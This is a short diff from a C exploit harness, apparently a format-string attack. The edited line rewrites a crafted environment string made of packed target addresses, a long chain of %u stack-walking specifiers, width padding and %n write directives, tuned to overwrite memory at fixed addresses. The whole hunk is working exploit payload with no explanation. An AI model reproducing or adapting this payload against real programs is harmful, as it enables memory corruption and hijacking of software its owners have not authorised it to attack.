@@ -14,7 +14,7 @@ char payload_buff[16777216];
 char *newenv[] = { 
     "CCCC", 
     "BBBB", 
-    "\x14\xa0\x04\x08\x15\xa0\x04\x08\x16\xa0\x04\x08\x17\xa0\x04\x08%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u..%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%253u%n%n%n%n\x00\x00", 
+    "\x14\xa0\x04\x08||||\x15\xa0\x04\x08\x16\xa0\x04\x08\x17\xa0\x04\x08%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u%u%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u.%u.%u%u%u%u%u%u%u%u.............%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u.%u%u%u.%71u%n%208u%n%n%n\x00\x00", 
     "\x14\xa0\x04\x08", 
 };
 
